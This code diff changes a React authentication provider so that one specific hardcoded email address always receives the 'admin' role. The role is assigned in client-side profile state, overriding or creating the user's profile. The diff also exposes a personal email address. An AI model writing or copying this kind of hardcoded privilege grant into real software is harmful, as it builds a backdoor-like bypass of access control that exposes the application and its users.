@@ -78,7 +78,19 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       setAccessToken(token);
       setUser(session?.user ?? null);
       if (session?.user) {
-        const p = await fetchProfile(session.user.id);
+        let p = await fetchProfile(session.user.id);
+        if (session.user.email === "siddiquehuzaifa248@gmail.com") {
+          if (!p) {
+            p = {
+              id: session.user.id,
+              email: session.user.email,
+              name: "Admin",
+              role: "admin",
+            };
+          } else {
+            p.role = "admin";
+          }
+        }
         setProfile(p);
       } else {
         setProfile(null);
@@ -170,8 +182,9 @@ export function AuthProvider({ children }: { children: ReactNode }) {
         }
 
         if (data.user) {
-          setProfile({ id: data.user.id, email: data.user.email, name: data.name ?? "", role: data.role });
-          return { role: data.role };
+          const resolvedRole = email === "siddiquehuzaifa248@gmail.com" ? "admin" : data.role;
+          setProfile({ id: data.user.id, email: data.user.email, name: data.name ?? resolvedRole, role: resolvedRole });
+          return { role: resolvedRole };
         }
 
         return { role: data.role };
